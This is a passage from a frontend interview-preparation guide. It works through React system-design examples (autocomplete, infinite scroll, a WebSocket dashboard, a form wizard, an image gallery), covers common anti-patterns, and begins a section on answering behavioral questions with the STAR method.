        setIsOpen(false);
        setSelectedIndex(-1);
        break;
    }
  };

  return (
    <div className="autocomplete">
      <input
        type="text"
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        onKeyDown={handleKeyDown}
        placeholder="Search..."
        role="combobox"
        aria-expanded={isOpen}
        aria-autocomplete="list"
        aria-controls="suggestions-list"
        aria-activedescendant={
          selectedIndex >= 0 ? `suggestion-${selectedIndex}` : undefined
        }
      />

      {isOpen && (
        <ul id="suggestions-list" role="listbox">
          {loading && <li>Loading...</li>}
          {error && <li>Error: {error.message}</li>}
          {suggestions.map((s, idx) => (
            <li
              key={s.id}
              id={`suggestion-${idx}`}
              role="option"
              aria-selected={idx === selectedIndex}
              className={idx === selectedIndex ? "selected" : ""}
              onClick={() => (window.location.href = s.url || "#")}
            >
              {s.label}
            </li>
          ))}
        </ul>
      )}

      {/* Screen reader announcements */}
      <div
        role="status"
        aria-live="polite"
        aria-atomic="true"
        className="sr-only"
      >
        {loading && "Loading results"}
        {suggestions.length > 0 && `${suggestions.length} results available`}
      </div>
    </div>
  );
}
```

**Performance Considerations:**

- âœ… Debounced at 300ms â€” avoids spamming API on every keystroke
- âœ… `AbortController` cancels in-flight requests â€” prevents race conditions
- âœ… Memoization not needed here (no expensive computations)
- âš ï¸ Could add caching with a `Map<query, results>` if users frequently backspace

**Accessibility Highlights:**

- `role="combobox"` on input, `role="listbox"` on suggestions
- `aria-expanded`, `aria-controls`, `aria-activedescendant` for screen readers
- Keyboard navigation (â†‘â†“ arrows, Enter, Esc)
- Live region announces result count

**Common Interview Questions:**

> Q: "What if the user types very fast and the API is slow? Could they see results for 'a' after they've typed 'abc'?"  
> A: "Yes, that's a race condition. I handle it with `AbortController` â€” when a new request starts, I cancel the previous one. The `signal` in `fetch()` ensures stale responses are ignored."

> Q: "How would you add caching?"  
> A: "I'd use a `useRef` to store a `Map<string, Suggestion[]>`. Before fetching, check if `query` is in the cache. If yes, return cached results immediately. If no, fetch and store in cache. Add a TTL or max size to avoid memory bloat."

> Q: "Why `setTimeout` in the effect instead of a debounce utility?"  
> A: "Good question â€” I could use lodash's `debounce`, but implementing it inline shows I understand the mechanism. In production, I'd use a proven library to avoid edge-case bugs."

---

#### Example 2: Infinite Scroll Feed with Optimistic Updates

**Problem Statement:**  
Design a social media feed with infinite scroll. When the user reaches the bottom, load the next page. If the user likes a post, show the heart icon immediately (optimistic update) before the API confirms.

**Requirements Clarification:**

> You: "How many posts per page?"  
> Interviewer: "20 posts per page."
>
> You: "Should I use offset-based or cursor-based pagination?"  
> Interviewer: "Cursor-based â€” the API returns a `nextCursor` token."
>
> You: "Do I need virtualization for performance?"  
> Interviewer: "Not required, but mention when you'd add it."

**Component Tree:**

```
FeedContainer
â”œâ”€â”€ FeedItem (repeated)
â”‚   â”œâ”€â”€ PostContent
â”‚   â”œâ”€â”€ LikeButton
â”‚   â””â”€â”€ CommentSection
â”œâ”€â”€ LoadingSpinner (at bottom)
â””â”€â”€ ErrorBoundary
```

**State Structure:**

```typescript
type Post = {
  id: string;
  content: string;
  likedByUser: boolean;
  likeCount: number;
};

type FeedState = {
  posts: Post[];
  nextCursor: string | null; // null = no more pages
  loading: boolean;
  error: Error | null;
};
```

**Code Skeleton:**

```tsx
import { useState, useEffect, useRef } from "react";

function InfiniteFeed() {
  const [posts, setPosts] = useState<Post[]>([]);
  const [nextCursor, setNextCursor] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<Error | null>(null);

  const observerRef = useRef<IntersectionObserver | null>(null);
  const sentinelRef = useRef<HTMLDivElement | null>(null);

  // Fetch initial page
  useEffect(() => {
    fetchPosts();
  }, []);

  // Set up Intersection Observer for infinite scroll
  useEffect(() => {
    if (!sentinelRef.current) return;

    observerRef.current = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting && !loading && nextCursor) {
          fetchPosts();
        }
      },
      { threshold: 1.0 },
    );

    observerRef.current.observe(sentinelRef.current);

    return () => observerRef.current?.disconnect();
  }, [loading, nextCursor]);

  async function fetchPosts() {
    setLoading(true);
    setError(null);

    try {
      const url = nextCursor ? `/api/feed?cursor=${nextCursor}` : "/api/feed";
      const res = await fetch(url);
      if (!res.ok) throw new Error("Failed to load posts");

      const data = await res.json();
      setPosts((prev) => [...prev, ...data.posts]);
      setNextCursor(data.nextCursor);
    } catch (err: any) {
      setError(err);
    } finally {
      setLoading(false);
    }
  }

  // Optimistic like
  async function handleLike(postId: string) {
    // 1. Update UI immediately
    setPosts((prev) =>
      prev.map((p) =>
        p.id === postId
          ? { ...p, likedByUser: true, likeCount: p.likeCount + 1 }
          : p,
      ),
    );

    try {
      // 2. Send to API
      const res = await fetch(`/api/posts/${postId}/like`, { method: "POST" });
      if (!res.ok) throw new Error("Like failed");
    } catch (err) {
      // 3. Rollback on failure
      setPosts((prev) =>
        prev.map((p) =>
          p.id === postId
            ? { ...p, likedByUser: false, likeCount: p.likeCount - 1 }
            : p,
        ),
      );
      alert("Failed to like post");
    }
  }

  return (
    <div className="feed">
      {posts.map((post) => (
        <div key={post.id} className="post">
          <p>{post.content}</p>
          <button
            onClick={() => handleLike(post.id)}
            disabled={post.likedByUser}
          >
            {post.likedByUser ? "â¤ï¸" : "ðŸ¤"} {post.likeCount}
          </button>
        </div>
      ))}

      {/* Sentinel element for intersection observer */}
      <div ref={sentinelRef} style={{ height: 20 }} />

      {loading && <p>Loading more...</p>}
      {error && <p>Error: {error.message}</p>}
      {!nextCursor && !loading && <p>No more posts</p>}
    </div>
  );
}
```

**Performance Considerations:**

- âœ… Intersection Observer triggers fetch when sentinel is visible (native, efficient)
- âš ï¸ No virtualization â€” fine for <500 posts, but at 1000+ posts, consider `react-window`
- âœ… Cursor-based pagination avoids "page drift" (new posts shifting offset indices)

**Optimistic Update Pattern:**

1. Update local state immediately (instant feedback)
2. Send API request in background
3. Rollback if API fails (with user notification)

**Common Interview Questions:**

> Q: "What if the user scrolls to the bottom very fast and triggers multiple fetches?"  
> A: "The `loading` flag in the Intersection Observer callback prevents concurrent requests. I could also debounce the callback, but the flag is simpler and sufficient here."

> Q: "When would you add virtualization?"  
> A: "When the DOM has >100 items rendered. Each DOM node has memory cost. Virtualization renders only visible items + a buffer. I'd use `react-window` or `react-virtualized`."

> Q: "What's the downside of cursor-based pagination?"  
> A: "You can't jump to page 5 directly â€” you have to load pages 1â€“4 first. For 'load more' UX that's fine, but for traditional page numbers, offset-based is better."

---

#### Example 3: Real-Time Dashboard with WebSocket

**Problem Statement:**  
Design a dashboard that displays live metrics (e.g., orders per minute, active users). Data comes from a WebSocket connection. If the connection drops, fall back to polling.

**Requirements Clarification:**

> You: "How frequently do updates arrive?"  
> Interviewer: "Every 1â€“2 seconds."
>
> You: "Should I throttle rapid updates to avoid re-renders?"  
> Interviewer: "Yes, good idea."
>
> You: "If WebSocket fails, what's the polling interval?"  
> Interviewer: "5 seconds."

**Component Tree:**

```
Dashboard
â”œâ”€â”€ MetricCard (repeated)
â”‚   â”œâ”€â”€ MetricValue
â”‚   â””â”€â”€ TrendChart
â””â”€â”€ ConnectionStatus (WebSocket / Polling / Disconnected)
```

**State Structure:**

```typescript
type Metric = {
  id: string;
  label: string;
  value: number;
  unit: string;
};

type DashboardState = {
  metrics: Metric[];
  connectionStatus: "connected" | "polling" | "disconnected";
  lastUpdate: Date | null;
};

// WebSocket message types (discriminated union)
type WSMessage =
  | { type: "metrics_update"; data: Metric[] }
  | { type: "ping" }
  | { type: "error"; message: string };
```

**Code Skeleton:**

```tsx
import { useState, useEffect, useRef } from "react";

function Dashboard() {
  const [metrics, setMetrics] = useState<Metric[]>([]);
  const [connectionStatus, setConnectionStatus] = useState<
    "connected" | "polling" | "disconnected"
  >("disconnected");
  const [lastUpdate, setLastUpdate] = useState<Date | null>(null);

  const wsRef = useRef<WebSocket | null>(null);
  const pollingTimerRef = useRef<NodeJS.Timeout | null>(null);
  const reconnectAttemptsRef = useRef(0);

  useEffect(() => {
    connectWebSocket();

    return () => {
      // Cleanup on unmount
      if (wsRef.current) {
        wsRef.current.close();
      }
      if (pollingTimerRef.current) {
        clearInterval(pollingTimerRef.current);
      }
    };
  }, []);

  function connectWebSocket() {
    const ws = new WebSocket("wss://api.example.com/metrics");
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("WebSocket connected");
      setConnectionStatus("connected");
      reconnectAttemptsRef.current = 0;
      // Stop polling if it was running
      if (pollingTimerRef.current) {
        clearInterval(pollingTimerRef.current);
        pollingTimerRef.current = null;
      }
    };

    ws.onmessage = (event) => {
      const message: WSMessage = JSON.parse(event.data);

      if (message.type === "metrics_update") {
        setMetrics(message.data);
        setLastUpdate(new Date());
      } else if (message.type === "error") {
        console.error("WebSocket error:", message.message);
      }
      // Ignore ping messages
    };

    ws.onerror = (error) => {
      console.error("WebSocket error:", error);
    };

    ws.onclose = () => {
      console.log("WebSocket disconnected");
      setConnectionStatus("disconnected");

      // Exponential backoff reconnection
      const delay = Math.min(1000 * 2 ** reconnectAttemptsRef.current, 30000); // max 30s
      reconnectAttemptsRef.current += 1;

      setTimeout(() => {
        if (reconnectAttemptsRef.current < 5) {
          console.log(
            `Reconnecting... attempt ${reconnectAttemptsRef.current}`,
          );
          connectWebSocket();
        } else {
          // After 5 failed attempts, fall back to polling
          console.log("WebSocket reconnection failed, falling back to polling");
          startPolling();
        }
      }, delay);
    };
  }

  function startPolling() {
    setConnectionStatus("polling");

    pollingTimerRef.current = setInterval(async () => {
      try {
        const res = await fetch("/api/metrics");
        if (!res.ok) throw new Error("Polling failed");
        const data = await res.json();
        setMetrics(data.metrics);
        setLastUpdate(new Date());
      } catch (err) {
        console.error("Polling error:", err);
      }
    }, 5000); // poll every 5 seconds
  }

  return (
    <div className="dashboard">
      <div className="status-bar">
        Status: <strong>{connectionStatus}</strong>
        {lastUpdate && (
          <span> Â· Last update: {lastUpdate.toLocaleTimeString()}</span>
        )}
      </div>

      <div className="metrics-grid">
        {metrics.map((metric) => (
          <div key={metric.id} className="metric-card">
            <h3>{metric.label}</h3>
            <p className="value">
              {metric.value} {metric.unit}
            </p>
          </div>
        ))}
      </div>
    </div>
  );
}
```

**Performance Considerations:**

- âœ… WebSocket is more efficient than polling (push vs pull)
- âœ… Exponential backoff prevents reconnection spam
- âš ï¸ If updates arrive every 100ms, throttle state updates to avoid 10 re-renders/sec

**WebSocket Lifecycle:**

1. **Open** â†’ Set status to `connected`, clear polling timer
2. **Message** â†’ Parse, update state
3. **Error** â†’ Log, wait for close event
4. **Close** â†’ Attempt reconnect with exponential backoff; after 5 failures, fall back to polling

**Common Interview Questions:**

> Q: "Why exponential backoff?"  
> A: "If the server is down, reconnecting immediately in a loop hammers it. Exponential backoff (1s, 2s, 4s, 8s, ...) gives the server time to recover. I cap at 30 seconds to avoid infinite waits."

> Q: "What if updates arrive faster than React can render?"  
> A: "I'd throttle the `setMetrics` call using lodash's `throttle` or a custom hook. For example, only update state at most once per 500ms. Buffer intermediate values if needed."

> Q: "How would you test this?"  
> A: "Mock the WebSocket with a fake server (libraries like `mock-socket`). Test: connection success, message handling, reconnection logic, fallback to polling. Integration test with a real WebSocket server in CI."

---

#### Example 4: Multi-Step Form Wizard with Validation

**Problem Statement:**  
Design a 3-step form wizard (e.g., personal info â†’ address â†’ payment). Validate each step before allowing navigation. Save draft to localStorage so users can resume later.

**Requirements Clarification:**

> You: "Should validation be on-blur or on-submit?"  
> Interviewer: "On-blur for immediate feedback, and re-validate on-submit."
>
> You: "Should the user be able to go back and edit previous steps?"  
> Interviewer: "Yes, they can navigate back freely."
>
> You: "How often should I auto-save the draft?"  
> Interviewer: "Debounce at 1 second after the user stops typing."

**Component Tree:**

```
FormWizard
â”œâ”€â”€ ProgressIndicator (step 1 of 3)
â”œâ”€â”€ StepContent
â”‚   â”œâ”€â”€ Step1PersonalInfo
â”‚   â”œâ”€â”€ Step2Address
â”‚   â””â”€â”€ Step3Payment
â”œâ”€â”€ NavigationButtons (Back / Next / Submit)
â””â”€â”€ DraftSaveIndicator
```

**State Structure:**

```typescript
type FormData = {
  step1: {
    name: string;
    email: string;
    phone: string;
  };
  step2: {
    street: string;
    city: string;
    zip: string;
  };
  step3: {
    cardNumber: string;
    cvv: string;
  };
};

type ValidationErrors = Partial<Record<keyof FormData[keyof FormData], string>>;

type WizardState = {
  currentStep: 1 | 2 | 3;
  formData: FormData;
  errors: ValidationErrors;
  isDraft: boolean; // true if loaded from localStorage
};
```

**Code Skeleton (simplified):**

```tsx
import { useState, useEffect } from "react";
import { z } from "zod"; // for validation schemas

// Validation schemas
const step1Schema = z.object({
  name: z.string().min(2, "Name must be at least 2 characters"),
  email: z.string().email("Invalid email"),
  phone: z.string().regex(/^\d{10}$/, "Phone must be 10 digits"),
});

const STORAGE_KEY = "form-wizard-draft";

function FormWizard() {
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3>(1);
  const [formData, setFormData] = useState<FormData>(() => {
    // Load draft from localStorage on mount
    const saved = localStorage.getItem(STORAGE_KEY);
    return saved ? JSON.parse(saved) : { step1: {}, step2: {}, step3: {} };
  });
  const [errors, setErrors] = useState<ValidationErrors>({});

  // Auto-save draft (debounced)
  useEffect(() => {
    const timer = setTimeout(() => {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(formData));
      console.log("Draft saved");
    }, 1000);

    return () => clearTimeout(timer);
  }, [formData]);

  function updateField(step: keyof FormData, field: string, value: string) {
    setFormData((prev) => ({
      ...prev,
      [step]: { ...prev[step], [field]: value },
    }));
  }

  function validateStep(step: 1 | 2 | 3): boolean {
    setErrors({});

    try {
      if (step === 1) {
        step1Schema.parse(formData.step1);
      }
      // Similar for step2, step3...
      return true;
    } catch (err: any) {
      if (err instanceof z.ZodError) {
        const fieldErrors: ValidationErrors = {};
        err.errors.forEach((e) => {
          fieldErrors[e.path[0] as string] = e.message;
        });
        setErrors(fieldErrors);
      }
      return false;
    }
  }

  function handleNext() {
    if (validateStep(currentStep)) {
      setCurrentStep((prev) => Math.min(prev + 1, 3) as 1 | 2 | 3);
    }
  }

  function handleBack() {
    setCurrentStep((prev) => Math.max(prev - 1, 1) as 1 | 2 | 3);
  }

  async function handleSubmit() {
    if (!validateStep(3)) return;

    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (!res.ok) throw new Error("Submission failed");

      // Clear draft on success
      localStorage.removeItem(STORAGE_KEY);
      alert("Form submitted successfully!");
    } catch (err) {
      alert("Submission failed. Please try again.");
    }
  }

  return (
    <div className="wizard">
      <ProgressIndicator current={currentStep} total={3} />

      {currentStep === 1 && (
        <div>
          <h2>Personal Info</h2>
          <input
            value={formData.step1.name || ""}
            onChange={(e) => updateField("step1", "name", e.target.value)}
            placeholder="Name"
          />
          {errors.name && <p className="error">{errors.name}</p>}
          {/* Similar for email, phone... */}
        </div>
      )}

      {/* Step 2 and 3... */}

      <div className="nav-buttons">
        {currentStep > 1 && <button onClick={handleBack}>Back</button>}
        {currentStep < 3 && <button onClick={handleNext}>Next</button>}
        {currentStep === 3 && <button onClick={handleSubmit}>Submit</button>}
      </div>
    </div>
  );
}
```

**Performance Considerations:**

- âœ… Debounced auto-save avoids spamming localStorage on every keystroke
- âœ… Zod validation is fast for typical forms (<100 fields)
- âš ï¸ If form has dozens of fields, consider splitting schemas into separate modules

**State Management Trade-offs:**

- **Local state (useState)** â€” simple, no boilerplate. Good for this case.
- **URL params** â€” shareable links, but leaks sensitive data (credit card) in URL. Not suitable here.
- **Context** â€” useful if wizard is deeply nested; overkill for flat structure.
- **Redux/Zustand** â€” only if form state needs to be shared across many routes.

**Common Interview Questions:**

> Q: "Why store draft in localStorage instead of sending to the API?"  
> A: "localStorage is instant and works offline. API draft save requires network, adds latency, and needs server storage. For sensitive data (payment info), I'd encrypt before storing locally or skip auto-save entirely."

> Q: "What if the user has two tabs open?"  
> A: "localStorage is shared across tabs, so changes in one tab overwrite the other. To sync, listen to the `storage` event and reload form data when another tab updates it. Or use a tab-specific key like `${STORAGE_KEY}-${tabId}`."

> Q: "How do you handle async validation (e.g., check if email exists in DB)?"  
> A: "Trigger async validation on-blur. Show a loading spinner while checking. If it fails (email taken), set error state. Don't block Next button â€” just show the error and let user fix it."

---

#### Example 5: Image Gallery with Lazy Loading & Filters

**Problem Statement:**  
Design an image gallery that displays 100+ images. Lazy-load images as they scroll into view. Allow filtering by category (stored in URL params for shareable links). Show skeleton screens while images load.

**Requirements Clarification:**

> You: "Should I use native lazy loading or Intersection Observer?"  
> Interviewer: "Intersection Observer â€” assume some users are on older browsers without native support."
>
> You: "How should filters work? Client-side or fetch from API?"  
> Interviewer: "Client-side filtering â€” all images are fetched once on mount."

**Component Tree:**

```
Gallery
â”œâ”€â”€ FilterBar
â”‚   â””â”€â”€ CategoryButton (repeated)
â”œâ”€â”€ ImageGrid
â”‚   â””â”€â”€ ImageCard (repeated)
â”‚       â”œâ”€â”€ Skeleton (while loading)
â”‚       â””â”€â”€ <img> (after load)
â””â”€â”€ EmptyState (no results)
```

**State Structure:**

```typescript
type Image = {
  id: string;
  url: string;
  category: string;
  alt: string;
};

type GalleryState = {
  images: Image[];
  selectedCategory: string | null; // null = all
  loadedImageIds: Set<string>; // track which images have loaded
};
```

**Code Skeleton:**

```tsx
import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom"; // or Next.js router

function Gallery() {
  const [images, setImages] = useState<Image[]>([]);
  const [loadedImageIds, setLoadedImageIds] = useState<Set<string>>(new Set());
  const [searchParams, setSearchParams] = useSearchParams();

  const selectedCategory = searchParams.get("category");

  useEffect(() => {
    // Fetch all images once
    fetch("/api/images")
      .then((res) => res.json())
      .then((data) => setImages(data.images));
  }, []);

  const filteredImages = selectedCategory
    ? images.filter((img) => img.category === selectedCategory)
    : images;

  function handleCategoryClick(cat: string | null) {
    if (cat) {
      setSearchParams({ category: cat });
    } else {
      setSearchParams({});
    }
  }

  return (
    <div className="gallery">
      <FilterBar
        categories={["Nature", "People", "Food", "Tech"]}
        selectedCategory={selectedCategory}
        onCategoryClick={handleCategoryClick}
      />

      <div className="image-grid">
        {filteredImages.map((img) => (
          <LazyImage
            key={img.id}
            image={img}
            onLoad={() =>
              setLoadedImageIds((prev) => new Set(prev).add(img.id))
            }
            isLoaded={loadedImageIds.has(img.id)}
          />
        ))}
      </div>

      {filteredImages.length === 0 && (
        <p className="empty-state">No images found for this category.</p>
      )}
    </div>
  );
}

function LazyImage({
  image,
  onLoad,
  isLoaded,
}: {
  image: Image;
  onLoad: () => void;
  isLoaded: boolean;
}) {
  const [isVisible, setIsVisible] = useState(false);
  const imgRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!imgRef.current) return;

    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting) {
          setIsVisible(true);
          observer.disconnect(); // stop observing once visible
        }
      },
      { threshold: 0.1 },
    );

    observer.observe(imgRef.current);

    return () => observer.disconnect();
  }, []);

  return (
    <div ref={imgRef} className="image-card">
      {!isLoaded && <Skeleton />}
      {isVisible && (
        <img
          src={image.url}
          alt={image.alt}
          onLoad={onLoad}
          style={{ display: isLoaded ? "block" : "none" }}
        />
      )}
    </div>
  );
}

function Skeleton() {
  return (
    <div
      className="skeleton"
      style={{ width: "100%", height: 200, background: "#ddd" }}
    />
  );
}
```

**Performance Considerations:**

- âœ… Intersection Observer triggers image load only when in viewport
- âœ… Client-side filtering avoids re-fetching from API (assuming dataset is small, <1000 images)
- âš ï¸ For large datasets (10,000+ images), fetch paginated by category

**URL State Sync:**

- Filter state is stored in `?category=Nature` URL param
- Benefits: shareable links, back button works, SEO-friendly
- Trade-off: URL updates trigger navigation events (use `replace` instead of `push` to avoid history pollution)

**Skeleton Screen vs Spinner:**

- **Skeleton** â€” better UX for known layout (image cards)
- **Spinner** â€” better for unknown content size (modal loading)

**Common Interview Questions:**

> Q: "Why Intersection Observer instead of native lazy loading (`<img loading="lazy">`)?"  
> A: "Native lazy loading is simpler but has limited browser support (no IE11, partial Safari). Intersection Observer gives full control over threshold and callbacks. In production, I'd use both: `loading="lazy"` as a fallback and Intersection Observer for custom behavior."

> Q: "What if filtering 10,000 images on the client is slow?"  
> A: "Move filtering to the server. Fetch `/api/images?category=Nature` instead of fetching all and filtering client-side. Or use a search index (Algolia, Meilisearch) for instant filtering."

> Q: "How would you handle failed image loads?"  
> A: "Add an `onError` handler on `<img>`. Set an error state, show a placeholder image or retry button. Track failed IDs to avoid infinite retry loops."

---

### 8.4 Trade-Off Discussion Templates

For **each** of the 5 examples above, be ready to discuss these trade-offs:

#### When to use X over Y?

| Scenario             | Option X              | Option Y                        | When to choose X                                         |
| -------------------- | --------------------- | ------------------------------- | -------------------------------------------------------- |
| **State management** | `useState`            | Context API                     | <3 levels of prop drilling, local to one component       |
|                      | Context API           | Redux                           | Shared across many routes, but no complex logic          |
|                      | Redux                 | Zustand                         | Need devtools, middleware, time-travel debugging         |
| **Data fetching**    | `useEffect` + `fetch` | React Query                     | Simple one-off fetch, no caching needed                  |
|                      | React Query           | SWR                             | Need caching, background refetch, stale-while-revalidate |
| **Lists**            | `.map()` directly     | Virtualization (`react-window`) | <100 items, no scroll performance issues                 |
| **Validation**       | Inline checks         | Zod/Yup schema                  | >5 fields, reusable validation, type safety              |

#### What breaks at scale?

- **Autocomplete** â€” If API is slow (>500ms), debounce isn't enough. Add caching or switch to a client-side search index (Fuse.js).
- **Infinite scroll** â€” At 10,000+ items in DOM, scroll becomes janky. Add virtualization.
- **WebSocket** â€” If server sends 100 messages/sec, React re-renders too often. Throttle state updates or batch them.
- **Form wizard** â€” If form has 50 fields, validation on every keystroke is slow. Validate on-blur only.
- **Image gallery** â€” If images are huge (5MB each), lazy loading delays are long. Use responsive images (`srcset`) and WebP format.

#### How to test this?

- **Unit tests** â€” Test pure functions: validation, formatting, data transformations
- **Integration tests** â€” Test component with mocked API (React Testing Library + MSW)
- **E2E tests** â€” Test full user flow (Cypress, Playwright)

Example for autocomplete:

1. Unit test: `debounce` function works correctly
2. Integration test: Type "react" â†’ mock API returns results â†’ verify results render
3. E2E test: Open app â†’ type in search â†’ select result â†’ navigate to detail page

---

### 8.5 Anti-Patterns to Avoid

#### 1. Prop Drilling Through 5+ Levels

**Bad:**

```tsx
<App>
  <Layout user={user}>
    <Sidebar user={user}>
      <UserMenu user={user}>
        <Avatar user={user} />
```

**Good:**

```tsx
// Use Context or component composition
const UserContext = createContext();

<UserContext.Provider value={user}>
  <App>
    <Layout>
      <Sidebar>
        <UserMenu />
```

**When to refactor:** If you're passing a prop through 3+ components that don't use it themselves.

---

#### 2. Premature Optimization

**Bad:**

```tsx
// Memoizing everything "just in case"
const add = useCallback((a, b) => a + b, []);
const result = useMemo(() => add(2, 3), [add]);
```

**Good:**

```tsx
// Memoize only when measured perf issue exists
const expensiveResult = useMemo(() => {
  return hugeArray.filter(...).map(...).reduce(...);
}, [hugeArray]);
```

**Rule:** Profile first, optimize second. `useMemo`/`useCallback` add overhead â€” only use when re-renders are measurably slow.

---

#### 3. Over-Engineering Small Features

**Bad:**

```tsx
// Using Redux for a 3-component app
dispatch(fetchUserRequest());
// 50 lines of reducer, actions, sagas...
```

**Good:**

```tsx
// Use local state or Context
const [user, setUser] = useState(null);
useEffect(() => {
  fetchUser().then(setUser);
}, []);
```

**Rule:** Start simple. Add complexity only when requirements demand it (many consumers, complex async logic, time-travel debugging).

---

#### 4. Ignoring Accessibility Until the End

**Bad:**

```tsx
<div onClick={handleClick}>Click me</div>
```

**Good:**

```tsx
<button onClick={handleClick}>Click me</button>
```

**Why:** Retrofitting a11y is expensive. Semantic HTML costs zero extra effort upfront.

**Checklist to apply from day 1:**

- Use semantic elements (`<button>`, `<nav>`, `<main>`)
- Add `aria-label` for icon buttons
- Ensure keyboard navigation works (Tab, Enter, Esc)
- Test with screen reader (VoiceOver on Mac, NVDA on Windows)

---

#### 5. Not Handling Loading/Error States

**Bad:**

```tsx
const [data, setData] = useState([]);
useEffect(() => {
  fetch('/api/data').then(res => res.json()).then(setData);
}, []);

return <div>{data.map(...)}</div>;
```

**Good:**

```tsx
const [data, setData] = useState([]);
const [loading, setLoading] = useState(true);
const [error, setError] = useState(null);

useEffect(() => {
  fetch('/api/data')
    .then(res => res.json())
    .then(setData)
    .catch(setError)
    .finally(() => setLoading(false));
}, []);

if (loading) return <Spinner />;
if (error) return <ErrorMessage error={error} />;
return <div>{data.map(...)}</div>;
```

**Why:** Users see blank screens or crashes if you don't handle these states.

---

#### 6. Missing Edge Cases

Common edge cases to always check:

- **Empty arrays** â€” `data.length === 0` â†’ show empty state
- **Null/undefined** â€” `user?.name` or `user ? user.name : 'Guest'`
- **Network failures** â€” always wrap `fetch` in try/catch
- **Race conditions** â€” use `AbortController` or ignore stale responses
- **Extremely long strings** â€” truncate or use `text-overflow: ellipsis`
- **Zero values** â€” `0` is falsy in JS, check explicitly: `value !== undefined`

---

### Summary: How to Approach Any System Design Question

1. **Clarify requirements** (functional + non-functional) â€” 2 min
2. **Sketch component tree** â€” 3 min
3. **Define state & data flow** â€” 5 min
4. **Discuss performance & a11y** â€” 3 min
5. **Mention testing strategy** â€” 2 min

**Total: 15 minutes of structured discussion before writing a single line of code.**

Then code the critical pieces (state management, API call, main component) on the whiteboard, narrating your reasoning.

**Your goal:** Demonstrate that you can:

- Break down ambiguous problems
- Make informed trade-offs
- Communicate clearly under pressure
- Anticipate edge cases and scale issues

Syntax perfection doesn't matter â€” clear thinking does.

---

## Phase 9 â€” Behavioral Interview (STAR Method)

**Why this matters:** Technical skills get you to the interview. Behavioral answers determine if they want to work with you. For IC roles, interviewers assess: ownership, collaboration, handling failure, and adaptability.

---

### 9.1 STAR Format Explained

**STAR** = **S**ituation â†’ **T**ask â†’ **A**ction â†’ **R**esult

This structure keeps answers concise, focused, and measurable.

#### What Each Letter Means

**S â€” Situation (15 seconds)**  
Set the context. Where were you? What was the challenge?

- âœ… Good: "I was working on an e-commerce checkout flow at Company X. The API was taking 3â€“5 seconds to respond, causing 15% cart abandonment."
- âŒ Bad: "We had a slow API."

**T â€” Task (15 seconds)**  
What was your specific responsibility? What goal were you trying to achieve?

- âœ… Good: "My task was to reduce checkout latency below 1 second while maintaining data accuracy."
- âŒ Bad: "We needed to make it faster." (Too vague, no ownership)

**A â€” Action (60 seconds)**  
What did **you** do? (Not "we" â€” use "I") Be specific about your contributions.

- âœ… Good: "I profiled the API with Chrome DevTools and found the bottleneck was a database query with no index. I worked with the backend engineer to add an index on `user_id`. On the frontend, I implemented optimistic UI updates â€” showing a spinner but immediately moving to the confirmation screen. I also added request caching with React Query so repeat checkouts didn't re-fetch."
- âŒ Bad: "We optimized the database and frontend." (No specifics, unclear who did what)

**R â€” Result (30 seconds)**  
What was the measurable outcome? Use numbers.

- âœ… Good: "Checkout latency dropped from 4s to 800ms. Cart abandonment decreased from 15% to 8%. The CEO mentioned it in the next all-hands as a major UX win."
- âŒ Bad: "It was faster and users were happier." (No metrics, vague)

**Total time: ~2 minutes**

---

#### Good vs Bad Examples

**Question:** "Tell me about a time you improved performance on a web app."

##### âŒ Bad Answer (too vague, no ownership, no metrics)

> "At my last job, we had a slow page. The team decided to optimize it. We refactored some components and it got faster. Users liked it."

**Why bad:**

- "We" not "I" â€” unclear what you did
- No context (what page? how slow?)
- No specific actions (what refactoring?)
- No measurable result (how much faster?)

##### âœ… Good Answer (STAR format, 2 minutes)

> **Situation:** At Company X, the product listing page was loading in 6 seconds on mobile, causing a 25% bounce rate.
>
> **Task:** I was tasked with reducing initial load time below 2 seconds and improving Largest Contentful Paint (LCP).
>
> **Action:** I used Lighthouse to identify bottlenecks. The main issue was a 2MB hero image and blocking JavaScript. I converted the image to WebP with srcset for responsive sizes, reducing it to 200KB. I implemented code splitting with React.lazy() to defer non-critical components. I also moved analytics scripts to load asynchronously. I worked with the backend team to enable HTTP/2 push for critical CSS.
>
> **Result:** Load time dropped to 1.8 seconds. LCP improved from 4.5s to 1.2s. Mobile bounce rate decreased from 25% to 12%. The change increased mobile conversions by 18%, which translated to $50K additional monthly revenue.

**Why good:**

- Clear context with measurable problem (6s load, 25% bounce)
- Specific ownership ("I used Lighthouse," "I implemented")
- Concrete actions with technical detail
- Measurable result with business impact ($50K revenue)

---

#### Three More Examples (Side-by-Side)

| Aspect               | âŒ Bad                            | âœ… Good                                                                                                                                                                                                                                    |
| -------------------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Ownership**        | "The team decided to use Redux."  | "I proposed Redux because we needed global state for 5+ routes. I compared it to Context API and Zustand, presented a doc with trade-offs, and got buy-in from the team."                                                                   |
| **Handling failure** | "A bug happened and we fixed it." | "I deployed a change that broke checkout for 15 minutes. I immediately rolled back, investigated the root cause (a missing null check), added tests to catch it, and implemented a staging environment checklist."                          |
| **Collaboration**    | "I worked with design."           | "The designer wanted a complex animation that would hurt performance. I built a prototype showing the FPS drop, proposed a simpler alternative, and we A/B tested both. The simpler version had 10% better engagement, so we shipped that." |

---

### 9.2 Five Core Question Categories

For each category below, you'll find:

1. Common question phrasings
2. What the interviewer is testing
3. A story template to fill out
4. Red flags to avoid

---

#### Category 1: Technical Conflict Resolution

**Common questions:**

- "Tell me about a time you disagreed with a teammate on a technical approach."
- "Describe a situation where you had to convince someone to change their design."
- "How do you handle code review feedback you disagree with?"

**What they're testing:**

- Can you disagree respectfully?
- Do you back your opinions with data?
- Can you compromise or escalate when needed?

**Story Template:**

> **Situation:** (Describe the project and the disagreement)  
> "I was working on [project]. My teammate wanted to [approach X], but I thought [approach Y] was better because [reason]."
>
> **Task:** (What was your goal?)  
